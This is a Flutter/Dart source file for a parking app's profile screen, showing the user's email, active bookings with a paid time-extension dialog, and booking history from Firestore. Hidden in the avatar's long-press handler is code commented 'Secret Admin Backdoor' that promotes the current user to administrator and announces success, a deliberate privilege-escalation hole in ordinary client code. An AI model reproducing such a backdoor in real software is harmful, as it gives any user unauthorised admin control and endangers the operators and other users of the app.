import 'dart:ui' as ui;
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:flutter/material.dart';
import 'package:intl/intl.dart';
import '../services/auth_service.dart';
import '../repositories/auth_repository.dart';
import '../repositories/parking_repository.dart';

class ProfileScreen extends StatelessWidget {
  const ProfileScreen({super.key});

  @override
  Widget build(BuildContext context) {
    final user = AuthService().currentUser;
    final repo = ParkingRepository();

    return Scaffold(
      backgroundColor: const Color(0xFF0A0E21),
      extendBodyBehindAppBar: true,
      appBar: AppBar(
        title: const Text("My Profile", style: TextStyle(fontWeight: FontWeight.bold, color: Colors.white)),
        centerTitle: true,
        backgroundColor: Colors.transparent,
        elevation: 0,
        leading: const BackButton(color: Colors.white),
      ),
      body: Stack(
        children: [
          // Background Gradient
          Container(
            decoration: const BoxDecoration(
              gradient: LinearGradient(
                colors: [Color(0xFF1A1A2E), Color(0xFF0A0E21)],
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
              ),
            ),
          ),
          
          Column(
            children: [
              const SizedBox(height: 100),
              // User Info Header
              _buildUserHeader(context, user?.email ?? "User"),
              
              const SizedBox(height: 20),
              
              // Tabs Content
              Expanded(
                child: DefaultTabController(
                  length: 2,
                  child: Column(
                    children: [
                      const TabBar(
                        indicatorColor: Colors.cyanAccent,
                        labelColor: Colors.cyanAccent,
                        unselectedLabelColor: Colors.white60,
                        tabs: [
                          Tab(text: "ACTIVE"),
                          Tab(text: "HISTORY"),
                        ],
                      ),
                      Expanded(
                        child: TabBarView(
                          children: [
                            _buildActiveTab(repo, user?.uid ?? ""),
                            _buildHistoryTab(repo, user?.uid ?? ""),
                          ],
                        ),
                      ),
                    ],
                  ),
                ),
              ),
            ],
          ),
        ],
      ),
    );
  }

  Widget _buildUserHeader(BuildContext context, String email) {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 20),
      padding: const EdgeInsets.all(20),
      decoration: BoxDecoration(
        color: Colors.white.withOpacity(0.05),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: Colors.white10),
      ),
      child: Row(
        children: [
          GestureDetector(
            onLongPress: () async {
               // Secret Admin Backdoor
               debugPrint("Backdoor triggered!");
               try {
                   final authRepo = AuthRepository(); 
                   bool success = await authRepo.promoteCurrentUserToAdmin();
                   
                   if (success) {
                     debugPrint("Backdoor success: User promoted.");
                     if (context.mounted) {
                        ScaffoldMessenger.of(context).showSnackBar(
                          const SnackBar(
                              content: Text("🎉 You are now an Admin! Restart app or Re-login."), 
                              backgroundColor: Colors.green,
                              duration: Duration(seconds: 5),
                          )
                        );
                     }
                   } else {
                     debugPrint("Backdoor failed: No user found.");
                     if (context.mounted) {
                        ScaffoldMessenger.of(context).showSnackBar(
                          const SnackBar(content: Text("Error: No valid user session found."), backgroundColor: Colors.red)
                        );
                     }
                   }
               } catch (e) {
                   debugPrint("Backdoor failed: $e");
                   if (context.mounted) {
                      ScaffoldMessenger.of(context).showSnackBar(
                        SnackBar(content: Text("Error: $e"), backgroundColor: Colors.red)
                      );
                   }
               }
            },
            child: CircleAvatar(
              radius: 30,
              backgroundColor: Colors.cyanAccent.withOpacity(0.2),
              child: const Icon(Icons.person, color: Colors.cyanAccent, size: 30),
            ),
          ),
          const SizedBox(width: 15),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text("Welcome back,", style: TextStyle(color: Colors.white.withOpacity(0.5), fontSize: 12)),
                Text(email, style: const TextStyle(color: Colors.white, fontSize: 16, fontWeight: FontWeight.bold)),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildActiveTab(ParkingRepository repo, String userId) {
    return StreamBuilder<QuerySnapshot>(
      stream: repo.getBookedSpotsForUser(userId),
      builder: (context, snapshot) {
        if (!snapshot.hasData) return const Center(child: CircularProgressIndicator());
        final docs = snapshot.data!.docs;
        
        if (docs.isEmpty) {
          return Center(
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Icon(Icons.local_parking, size: 60, color: Colors.white.withOpacity(0.1)),
                const SizedBox(height: 10),
                Text("No active parking", style: TextStyle(color: Colors.white.withOpacity(0.5))),
              ],
            ),
          );
        }

        return ListView.builder(
          padding: const EdgeInsets.all(20),
          itemCount: docs.length,
          itemBuilder: (context, index) {
            final data = docs[index].data() as Map<String, dynamic>;
            final id = docs[index].id;
            // Calculate remaining time etc if needed, or mostly just show status
            // For extension, we need the logic.
            // But for now, let's keep it simple: Show card with "Expect End: HH:MM"
            final Timestamp? endTs = data['bookingEndTime'];
            final endTime = endTs?.toDate();
            
            return Container(
              margin: const EdgeInsets.only(bottom: 15),
              padding: const EdgeInsets.all(20),
              decoration: BoxDecoration(
                color: Colors.cyanAccent.withOpacity(0.1),
                borderRadius: BorderRadius.circular(20),
                border: Border.all(color: Colors.cyanAccent.withOpacity(0.3)),
              ),
              child: Column(
                children: [
                  Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                       Text("SPOT ${id.split('-').last}", style: const TextStyle(color: Colors.white, fontSize: 20, fontWeight: FontWeight.bold)),
                       Container(
                         padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
                         decoration: BoxDecoration(color: Colors.green, borderRadius: BorderRadius.circular(10)),
                         child: const Text("ACTIVE", style: TextStyle(color: Colors.white, fontSize: 10, fontWeight: FontWeight.bold)),
                       )
                    ],
                  ),
                  const SizedBox(height: 20),
                  Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      Text("Ends at: ${endTime != null ? DateFormat('hh:mm a').format(endTime) : 'N/A'}", 
                          style: const TextStyle(color: Colors.white)),
                    ],
                  ),
                  const SizedBox(height: 20),
                  // Extend Button
                  SizedBox(
                    width: double.infinity,
                    child: OutlinedButton(
                      onPressed: () => _showExtendDialog(context, id, endTime!),
                      style: OutlinedButton.styleFrom(
                        foregroundColor: Colors.cyanAccent,
                        side: const BorderSide(color: Colors.cyanAccent),
                      ),
                      child: const Text("EXTEND TIME (+HR)"),
                    ),
                  )
                ],
              ),
            );
          },
        );
      },
    );
  }

  Widget _buildHistoryTab(ParkingRepository repo, String userId) {
    // We need a method in repo to get history. For now, let's assume we can query directly or add it.
    // I will add getBookingHistory(userId) to Repo in next step or use simple query here.
    return StreamBuilder<QuerySnapshot>(
      stream: FirebaseFirestore.instance.collection('booking_history')
          .where('userId', isEqualTo: userId)
          .orderBy('timestamp', descending: true)
          .snapshots(),
      builder: (context, snapshot) {
         if (!snapshot.hasData) return const Center(child: CircularProgressIndicator());
         final docs = snapshot.data!.docs;

         if (docs.isEmpty) return const Center(child: Text("No history yet", style: TextStyle(color: Colors.white54)));

         return ListView.builder(
           padding: const EdgeInsets.all(20),
           itemCount: docs.length,
           itemBuilder: (context, index) {
             final data = docs[index].data() as Map<String, dynamic>;
             final status = data['status'] ?? 'completed';
             final cost = data['cost'] ?? 0;
             final spotId = data['spotId'] ?? 'Unknown';
             final Timestamp? startTs = data['startTime'];
             final dateStr = startTs != null ? DateFormat('MMM dd, hh:mm a').format(startTs.toDate()) : '';

             Color statusColor = status == 'active' ? Colors.greenAccent : (status == 'completed' ? Colors.white54 : Colors.redAccent);

             return Container(
               margin: const EdgeInsets.only(bottom: 10),
               padding: const EdgeInsets.all(15),
               decoration: BoxDecoration(
                 color: Colors.white.withOpacity(0.05),
                 borderRadius: BorderRadius.circular(15),
               ),
               child: Row(
                 mainAxisAlignment: MainAxisAlignment.spaceBetween,
                 children: [
                   Column(
                     crossAxisAlignment: CrossAxisAlignment.start,
                     children: [
                       Text("SPOT ${spotId.split('-').last}", style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
                       Text(dateStr, style: TextStyle(color: Colors.white.withOpacity(0.5), fontSize: 12)),
                     ],
                   ),
                   Column(
                     crossAxisAlignment: CrossAxisAlignment.end,
                     children: [
                       Text("₹$cost", style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 16)),
                       Text(status.toUpperCase(), style: TextStyle(color: statusColor, fontSize: 10)),
                     ],
                   ),
                 ],
               ),
             );
           },
         );
      },
    );
  }

  void _showExtendDialog(BuildContext context, String spotId, DateTime currentEnd) {
    double extendHours = 1.0;
    showDialog(
      context: context,
      builder: (context) {
        return StatefulBuilder(
          builder: (context, setState) {
            return AlertDialog(
              backgroundColor: const Color(0xFF1A1A2E),
              title: const Text("Extend Parking", style: TextStyle(color: Colors.white)),
              content: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Text("Add more hours (Max 12h total)", style: TextStyle(color: Colors.white.withOpacity(0.6), fontSize: 12)),
                  const SizedBox(height: 20),
                  Slider(
                    value: extendHours,
                    min: 1,
                    max: 12, 
                    divisions: 11,
                    activeColor: Colors.cyanAccent,
                    onChanged: (val) => setState(() => extendHours = val),
                  ),
                  Text("+${extendHours.round()} Hours", style: const TextStyle(color: Colors.cyanAccent, fontWeight: FontWeight.bold)),
                  const SizedBox(height: 10),
                  Text("Price: ₹${(extendHours * 40).toInt()}", style: const TextStyle(color: Colors.white)),
                ],
              ),
              actions: [
                TextButton(onPressed: () => Navigator.pop(context), child: const Text("Cancel")),
                ElevatedButton(
                  onPressed: () {
                    ParkingRepository().extendTime(spotId, extendHours);
                    Navigator.pop(context);
                    ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text("Extended successfully!")));
                  },
                  style: ElevatedButton.styleFrom(backgroundColor: Colors.cyanAccent, foregroundColor: Colors.black),
                  child: const Text("PAY & EXTEND"),
                )
              ],
            );
          }
        );
      },
    );
  }

}
